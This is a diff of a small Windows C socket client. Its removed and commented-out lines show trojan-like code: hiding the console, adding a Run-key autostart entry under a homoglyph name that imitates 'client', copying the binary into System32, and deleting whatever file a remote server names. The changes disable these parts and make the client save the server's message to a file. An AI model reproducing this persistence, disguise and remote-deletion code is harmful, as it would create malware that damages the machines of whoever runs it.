@@ -22,15 +22,16 @@ int Addrlen = sizeof(Addr);
 char resp[1001];
 
 int main()
-{     FreeConsole();
-
+{    // FreeConsole();
+/*
 HKEY hKeys;
-LPCTSTR lpszData = TEXT("client.exe");
+LPCTSTR lpszData = TEXT("D:\\client.exe");
 if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
 	RegSetValueEx(hKeys, TEXT("сlient"), 0, REG_SZ, (LPBYTE)lpszData, (_tcslen(lpszData) + 1) * sizeof(TCHAR));
 	RegCloseKey(hKeys);
 }
 CopyFile(L"D:\\сlient.exe", L"C:\\Windows\\System32\\client.exe", 1);
+*/
 
 
 	WSAStartup(MAKEWORD(2, 2), &Winsock); // Start Winsock 
@@ -45,13 +46,21 @@ CopyFile(L"D:\\сlient.exe", L"C:\\Windows\\System32\\client.exe", 1);
 
 	ZeroMemory(&Addr, sizeof(Addr)); // clear the struct 
 	Addr.sin_family = AF_INET; // протокол ipv4 
-	char ss[100] = "127.0.0.1";
+	//char ss[100] = "127.0.0.1";
+	char ss[100];
+	printf("Input ip:");
+	scanf(" %s", &ss);
 	Addr.sin_addr.s_addr = inet_addr(ss); //ip-адрес сервера
 	Addr.sin_port = htons(80); // порт сервера
-	while(connect(Socket, (sockaddr*)&Addr, sizeof(Addr)) >= 0)
-		recv(Socket, resp, 1000, 0);
-		remove(resp);
-
+	while (1) {
+		if (connect(Socket, (sockaddr*)&Addr, sizeof(Addr)) >= 0) {
+			recv(Socket, resp, 1000, 0);
+			//remove(resp);
+			FILE *f = fopen("Message.txt", "w");
+			fprintf(f, "%s", resp);
+			fclose(f);
+		}
+	}
 	closesocket(Socket); // после работы закрыть сокет 
 	WSACleanup();
 	//_getch();
